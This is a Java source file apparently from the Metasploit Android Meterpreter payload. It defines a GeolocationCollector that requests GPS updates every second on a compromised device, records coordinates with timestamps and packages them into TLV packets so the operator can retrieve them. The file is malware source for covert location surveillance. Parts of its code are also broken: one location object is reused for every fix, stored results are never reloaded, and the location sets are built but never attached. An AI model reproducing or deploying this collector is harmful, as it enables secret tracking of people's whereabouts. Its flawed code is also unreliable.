package com.metasploit.meterpreter;

import com.metasploit.meterpreter.android.interval_collect;


import android.content.Context;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.os.Bundle;

import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.IOException;

import java.lang.InterruptedException;
import java.lang.Math;
//import java.lang.string;

import java.util.ArrayList;
import java.util.Collections;
import java.util.List;
import java.util.Hashtable;

//Logging
import android.util.Log;

//This class 
public class GeolocationCollector extends IntervalCollector {

    private static final long MINIMUM_DISTANCE_CHANGE_FOR_UPDATES = 1; // in Meters
    private static final long MINIMUM_TIME_BETWEEN_UPDATES = 1000; // in Milliseconds


	private final Object syncObject = new Object();
	protected LocationManager mLocationManager;
	public Location mLocationObj;
	public GeoModel mGeoModolObj = new GeoModel();
	private Hashtable<Long, List<GeoModel>> collections = null;
	List<GeoModel> mGeoTagList = new ArrayList<GeoModel>();
   
	
	private class GeoModel {

	    public long mUnixEpoch;
	    public double  mLatitude,mLongitude;
	    private String Geolatsring,Geolongstring ;         
	     
	    public void setmUnixEpoch(){
	        mUnixEpoch =  System.currentTimeMillis();
	    }

	    public void  setLatitudeAndLong(Location location ){
	       // mLatitude
	        mLatitude = location.getLatitude();
	        mLongitude = location.getLongitude();
	    }

	    public void write(DataOutputStream output) throws IOException {
           // output.writeUTF(this.mUnixEpoch);
           Geolatsring = Double.toString(this.mLatitude);
           Geolongstring = Double.toString(this.mLongitude);
           output.writeLong(this.mUnixEpoch);
	  output.writeChars(Geolatsring);
	  output.writeChars(Geolongstring);
             }
	}

    private class MyLocationListener implements LocationListener {

        public void onLocationChanged(Location location) {
            String message = String.format(
                    "New Location \n Longitude: %1$s \n Latitude: %2$s",
                    location.getLongitude(), location.getLatitude()
            );
            //Toast.makeText(GeoTagging.this, message, Toast.LENGTH_LONG).show();
            Log.d("MyLocationListener","message ="+message);

            mGeoModolObj.setmUnixEpoch();
            mGeoModolObj.setLatitudeAndLong(location);
            mGeoTagList.add(mGeoModolObj);

        }

        public void onStatusChanged(String s, int i, Bundle b) {
            //Toast.makeText(GeoTagging.this, "Provider status changed",
            //        Toast.LENGTH_LONG).show();
            Log.d("MyLocationListener","onStatusChanged ="+s +" : i= "+i);

        }

        public void onProviderDisabled(String s) {
            //Toast.makeText(GeoTagging.this,
            //        "Provider disabled by the user. GPS turned off",
            //        Toast.LENGTH_LONG).show();
            Log.d("MyLocationListener","onProviderDisabled ="+s);
        }

        public void onProviderEnabled(String s) {
            //Toast.makeText(GeoTagging.this,
            //        "Provider enabled by the user. GPS turned on",
            //        Toast.LENGTH_LONG).show();
            Log.d("MyLocationListener","onProviderEnabled ="+s);
        }

    }

	
    public GeolocationCollector(int collectorId, Context context, long timeout) {
        super(collectorId, context, timeout);
        this.collections = new Hashtable<Long, List<GeoModel>>();
        mLocationManager = (LocationManager) AndroidMeterpreter.getContext()
				   .getSystemService(Context.LOCATION_SERVICE);
        mLocationManager.requestLocationUpdates(
                LocationManager.GPS_PROVIDER,
                MINIMUM_TIME_BETWEEN_UPDATES,
                MINIMUM_DISTANCE_CHANGE_FOR_UPDATES,
                new MyLocationListener()
        );
    }

    public GeolocationCollector(int collectorId, Context context) {
        super(collectorId, context);
        this.collections = new Hashtable<Long, List<GeoModel>>();
        mLocationManager = (LocationManager) AndroidMeterpreter.getContext()
				   .getSystemService(Context.LOCATION_SERVICE);
        mLocationManager.requestLocationUpdates(
                LocationManager.GPS_PROVIDER,
                MINIMUM_TIME_BETWEEN_UPDATES,
                MINIMUM_DISTANCE_CHANGE_FOR_UPDATES,
                new MyLocationListener()
        );
    }    

 	protected void init() {

        //if (this.receiver == null) {
        //    this.receiver = new LocationResultReceiver(this.context, this.getTimeout());
        //}
    }

    protected void deinit() {

        //this.receiver = null;
    }

 	protected boolean collect(DataOutputStream output) throws IOException {
        //List<ScanResult> scanResults = this.receiver.runScan();
        List<GeoModel> lGeoTagList = new ArrayList<GeoModel>();
        if (mGeoTagList != null) {
            // List<WifiResult> results = new ArrayList<WifiResult>();
            // for (ScanResult scanResult : scanResults) {
            //     results.add(new WifiResult(scanResult));
            // }

            synchronized (this.syncObject) {
                this.collections.put(System.currentTimeMillis(), mGeoTagList);

                // collect requires the result to be the serialised version of
                // the collection data so that it can be written to disk
                output.writeLong(this.timeout);
                output.writeInt(this.collections.size());
                for (Long ts : this.collections.keySet()) {
                    lGeoTagList = this.collections.get(ts.longValue());
                    output.writeLong(ts.longValue());
                    output.writeInt(lGeoTagList.size());
                    for (GeoModel geoLocationResult : lGeoTagList) {
                        geoLocationResult.write(output);
                    }
                }
            }

            return true;
        }

        return false;
    }

     protected void loadFromMemory(DataInputStream input) throws IOException {
        this.timeout = input.readLong();
        int collectionCount = input.readInt();
        for (int i = 0; i < collectionCount; ++i) {
            long ts = input.readLong();
            int resultCount = input.readInt();
            List<GeoModel  > results = new ArrayList<GeoModel  >();
            for (int j = 0; j < resultCount; ++j) {
                //results.add(new GeoModel  (input));
            }
            this.collections.put(ts, results);
        }
    }

    public boolean flush(TLVPacket packet) {
        Hashtable<Long, List<GeoModel>> collections = this.collections;
          synchronized (this.syncObject) {
            // create a new collection, for use on the other thread
            // if it's running
            this.collections = new Hashtable<Long, List<GeoModel>>();
        }

        List<Long> sortedKeys = new ArrayList<Long>(collections.keySet());
        Collections.sort(sortedKeys);

        for (Long ts : sortedKeys) {
            long timestamp = ts.longValue();
            List<GeoModel> GeolocResults = collections.get(timestamp);

            TLVPacket resultSet = new TLVPacket();

            try {
                resultSet.add(interval_collect.TLV_TYPE_COLLECT_RESULT_TIMESTAMP, timestamp / 1000);
            }
            catch (IOException ex) {
                // not good, but not much we can do here
            }

            for (int i = 0; i < GeolocResults .size(); ++i) {
                GeoModel result = GeolocResults .get(i);
                TLVPacket geolocationSet = new TLVPacket();

                try {
                    geolocationSet.add(interval_collect.TLV_TYPE_GEO_LAT, result.mLatitude);
                    geolocationSet.add(interval_collect.TLV_TYPE_GEO_LONG, result.mLongitude);
                    // level is negative, but it'll be converted to positive on the flip side.
                    //geolocationSet.add(interval_collect.TLV_TYPE_COLLECT_RESULT_WIFI_LEVEL, Math.abs(result.getLevel()));

                    //resultSet.addOverflow(interval_collect.TLV_TYPE_COLLECT_RESULT_GEO_LAT, geolocationSet);
					//resultSet.addOverflow(interval_collect.TLV_TYPE_COLLECT_RESULT_GEO_LONG, geolocationSet);
                }
                catch (IOException ex) {
                    // not good, but not much we can do here
                }
            }

            try {
                packet.addOverflow(interval_collect.TLV_TYPE_COLLECT_RESULT_GROUP, resultSet);
            }
            catch (IOException ex) {
                // not good, but not much we can do here
            }
        }

        return true;
    }
}

